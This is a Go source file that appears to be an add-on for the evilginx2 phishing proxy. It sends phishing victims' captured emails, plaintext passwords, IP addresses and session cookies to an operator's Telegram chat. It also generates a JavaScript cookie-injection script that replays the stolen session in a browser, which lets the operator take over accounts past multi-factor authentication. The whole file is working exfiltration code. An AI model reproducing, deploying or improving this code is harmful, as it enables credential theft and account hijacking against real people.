package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type TelegramNotifier struct {
	cfg *Config
}

func NewTelegramNotifier(cfg *Config) *TelegramNotifier {
	return &TelegramNotifier{
		cfg: cfg,
	}
}

// SendCredentialsNotification sends only username/password when captured (no cookies)
func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session) error {
	if !t.cfg.IsTelegramEnabled() {
		return nil
	}

	// Only send if we have both username and password
	if session.Username == "" || session.Password == "" {
		return nil
	}

	botToken := t.cfg.GetTelegramBotToken()
	chatID := t.cfg.GetTelegramChatID()

	// Parse user agent to get browser
	browser := parseUserAgent(session.UserAgent)

	// Format time
	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")

	// Build message - credentials only, no cookies yet
	message := fmt.Sprintf(`🔐 Credentials Captured

🆔 Session ID: %d
🎣 Phishlet: %s
👤 Email: %s
🔑 Password: %s
🌐 Browser: %s
📍 IP Address: %s
🗓 Time: %s

⏳ Waiting for session cookies...`,
		session.Id,
		session.Phishlet,
		session.Username,
		session.Password,
		browser,
		session.RemoteAddr,
		timeStr,
	)

	log.Success("Sending credentials notification for session %d", session.Id)
	return t.sendMessage(botToken, chatID, message)
}

// SendCookiesNotification sends cookies when they are captured (same format as credentials, with cookie file)
func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) error {
	if !t.cfg.IsTelegramEnabled() {
		return nil
	}

	// Only send if we have cookies
	if len(session.CookieTokens) == 0 {
		return nil
	}

	botToken := t.cfg.GetTelegramBotToken()
	chatID := t.cfg.GetTelegramChatID()

	// Parse user agent to get browser
	browser := parseUserAgent(session.UserAgent)

	// Format time
	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")

	// Count cookies
	cookieCount := 0
	for _, domainCookies := range session.CookieTokens {
		cookieCount += len(domainCookies)
	}

	// Build message - same format as credentials, with cookies info
	message := fmt.Sprintf(`🍪 Session Cookies Captured!

🆔 Session ID: %d
🎣 Phishlet: %s
👤 Email: %s
🔑 Password: %s
🌐 Browser: %s
📍 IP Address: %s
🗓 Time: %s
📊 Cookies: %d

✅ Full session capture complete!`,
		session.Id,
		session.Phishlet,
		session.Username,
		session.Password,
		browser,
		session.RemoteAddr,
		timeStr,
		cookieCount,
	)

	// Generate cookie file content in JavaScript format
	cookieFileContent := generateCookieJavaScript(session, timeStr)
	
	// Create filename with username
	safeUsername := strings.ReplaceAll(session.Username, "@", "_at_")
	safeUsername = strings.ReplaceAll(safeUsername, ".", "_")
	filename := fmt.Sprintf("cookies_%s_%d.txt", safeUsername, session.Id)

	// Send the document with caption
	log.Success("Sending cookies notification for session %d (%d cookies)", session.Id, cookieCount)
	return t.sendDocument(botToken, chatID, message, filename, cookieFileContent)
}

// SendSessionNotification - kept for backward compatibility (test functionality)
func (t *TelegramNotifier) SendSessionNotification(session *database.Session) error {
	if !t.cfg.IsTelegramEnabled() {
		return nil
	}

	// Only send if we have both username and password
	if session.Username == "" || session.Password == "" {
		return nil
	}

	botToken := t.cfg.GetTelegramBotToken()
	chatID := t.cfg.GetTelegramChatID()

	// Parse user agent to get browser
	browser := parseUserAgent(session.UserAgent)

	// Format time
	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")

	// Build message (without cookies - those go in the file)
	message := fmt.Sprintf(`🚨 New Session Captured

🆔 Session ID: %d
👤 Email: %s
🔑 Password: %s
🌐 Browser: %s
📍 IP Address: %s
🗓 Time: %s

🍪 Cookies for %s`,
		session.Id,
		session.Username,
		session.Password,
		browser,
		session.RemoteAddr,
		timeStr,
		session.Username,
	)

	// Generate cookie file content in JavaScript format
	cookieFileContent := generateCookieJavaScript(session, timeStr)
	
	// Create filename with username
	safeUsername := strings.ReplaceAll(session.Username, "@", "_at_")
	safeUsername = strings.ReplaceAll(safeUsername, ".", "_")
	filename := fmt.Sprintf("cookies_%s_%d.txt", safeUsername, session.Id)

	// Send the document with caption
	return t.sendDocument(botToken, chatID, message, filename, cookieFileContent)
}

func (t *TelegramNotifier) sendDocument(botToken, chatID, caption, filename, fileContent string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	// Create multipart form
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Add chat_id field
	writer.WriteField("chat_id", chatID)
	
	// Add caption field
	writer.WriteField("caption", caption)

	// Add document file
	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	io.WriteString(part, fileContent)

	writer.Close()

	// Send request
	req, err := http.NewRequest("POST", url, &buf)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Error("Telegram document send failed: %v", err)
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		log.Error("Telegram API returned status: %d - %s", resp.StatusCode, string(body))
		return fmt.Errorf("telegram API error: %d", resp.StatusCode)
	}

	log.Success("Telegram notification sent with cookies file: %s", filename)
	return nil
}

func (t *TelegramNotifier) sendMessage(botToken, chatID, message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]interface{}{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "Markdown",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Error("Telegram notification failed: %v", err)
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Error("Telegram API returned status: %d", resp.StatusCode)
		return fmt.Errorf("telegram API error: %d", resp.StatusCode)
	}

	return nil
}

func generateCookieJavaScript(session *database.Session, timeStr string) string {
	var sb strings.Builder

	sb.WriteString("(() => {\n")
	sb.WriteString("    let cookies = [\n")

	cookieCount := 0
	var earliestExpiry int64 = 0
	var latestExpiry int64 = 0
	sessionCookieCount := 0

	for domain, domainCookies := range session.CookieTokens {
		for name, cookie := range domainCookies {
			if cookieCount > 0 {
				sb.WriteString(",\n")
			}
			
			// Track expiration stats
			if cookie.Session {
				sessionCookieCount++
			} else if cookie.Expires > 0 {
				if earliestExpiry == 0 || cookie.Expires < earliestExpiry {
					earliestExpiry = cookie.Expires
				}
				if cookie.Expires > latestExpiry {
					latestExpiry = cookie.Expires
				}
			}

			// Escape the value for JSON
			escapedValue := escapeJSONString(cookie.Value)
			escapedPath := cookie.Path
			if escapedPath == "" {
				escapedPath = "/"
			}
			
			sb.WriteString(fmt.Sprintf(`        {
            "name": "%s",
            "value": "%s",
            "domain": "%s",
            "path": "%s",
            "expires": %d,
            "expiresHuman": "%s",
            "size": %d,
            "httpOnly": %t,
            "secure": %t,
            "session": %t,
            "sameSite": "%s",
            "hostOnly": %t
        }`, 
				name, 
				escapedValue, 
				domain, 
				escapedPath, 
				cookie.Expires,
				cookie.ExpiresHuman,
				len(name)+len(cookie.Value),
				cookie.HttpOnly,
				cookie.Secure,
				cookie.Session,
				cookie.SameSite,
				cookie.HostOnly,
			))
			cookieCount++
		}
	}

	sb.WriteString("\n    ];\n\n")
	
	// Add expiration summary as comment
	sb.WriteString("    /*\n")
	sb.WriteString(fmt.Sprintf("     * 📊 Cookie Expiration Summary:\n"))
	sb.WriteString(fmt.Sprintf("     * Total cookies: %d\n", cookieCount))
	sb.WriteString(fmt.Sprintf("     * Session cookies (expire on browser close): %d\n", sessionCookieCount))
	if earliestExpiry > 0 {
		sb.WriteString(fmt.Sprintf("     * ⚠️ Earliest expiry: %s\n", time.Unix(earliestExpiry, 0).UTC().Format("2006-01-02 15:04:05 UTC")))
		sb.WriteString(fmt.Sprintf("     * Latest expiry: %s\n", time.Unix(latestExpiry, 0).UTC().Format("2006-01-02 15:04:05 UTC")))
		
		// Calculate time remaining
		timeRemaining := time.Until(time.Unix(earliestExpiry, 0))
		if timeRemaining > 0 {
			if timeRemaining.Hours() > 24 {
				days := int(timeRemaining.Hours() / 24)
				sb.WriteString(fmt.Sprintf("     * ⏰ Time until earliest expiry: ~%d days\n", days))
			} else if timeRemaining.Hours() >= 1 {
				sb.WriteString(fmt.Sprintf("     * ⏰ Time until earliest expiry: ~%.0f hours\n", timeRemaining.Hours()))
			} else {
				sb.WriteString(fmt.Sprintf("     * ⏰ Time until earliest expiry: ~%.0f minutes\n", timeRemaining.Minutes()))
			}
		} else {
			sb.WriteString("     * ⚠️ WARNING: Some cookies may have already expired!\n")
		}
	}
	sb.WriteString("     */\n\n")

	sb.WriteString(`    function setCookie(cookie) {
        let domain = cookie.domain || window.location.hostname;
        let expires = '';
        
        if (cookie.expires > 0) {
            let date = new Date(cookie.expires * 1000);
            expires = 'expires=' + date.toUTCString() + ';';
        }
        
        let secure = cookie.secure ? 'Secure;' : '';
        let sameSite = cookie.sameSite ? 'SameSite=' + cookie.sameSite + ';' : '';
        
        if (cookie.name.startsWith('__Host')) {
            document.cookie = ` + "`${cookie.name}=${cookie.value};${expires}path=${cookie.path};Secure;SameSite=None`" + `;
        } else if (cookie.name.startsWith('__Secure')) {
            document.cookie = ` + "`${cookie.name}=${cookie.value};${expires}domain=${domain};path=${cookie.path};Secure;SameSite=None`" + `;
        } else {
            document.cookie = ` + "`${cookie.name}=${cookie.value};${expires}domain=${domain};path=${cookie.path};${secure}${sameSite}`" + `;
        }
    }

    for (let cookie of cookies) {
        setCookie(cookie);
    }
    
    console.log('✅ ' + cookies.length + ' cookies injected successfully!');
    window.location.reload();
})();
`)
	sb.WriteString("\n// ✅ Cookies injection script generated!\n")
	sb.WriteString(fmt.Sprintf("// Generated: %s\n", timeStr))

	return sb.String()
}

func parseUserAgent(ua string) string {
	ua = strings.ToLower(ua)
	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "edg") {
		return "Chrome"
	} else if strings.Contains(ua, "firefox") {
		return "Firefox"
	} else if strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome") {
		return "Safari"
	} else if strings.Contains(ua, "edg") {
		return "Edge"
	} else if strings.Contains(ua, "opera") || strings.Contains(ua, "opr") {
		return "Opera"
	} else if strings.Contains(ua, "msie") || strings.Contains(ua, "trident") {
		return "Internet Explorer"
	}
	return "Unknown"
}

func escapeJSONString(s string) string {
	// Escape special characters for JSON string
	replacer := strings.NewReplacer(
		"\\", "\\\\",
		"\"", "\\\"",
		"\n", "\\n",
		"\r", "\\r",
		"\t", "\\t",
	)
	return replacer.Replace(s)
}

func escapeMarkdown(text string) string {
	// Escape special markdown characters
	replacer := strings.NewReplacer(
		"_", "\\_",
		"*", "\\*",
		"[", "\\[",
		"]", "\\]",
		"`", "\\`",
	)
	return replacer.Replace(text)
}
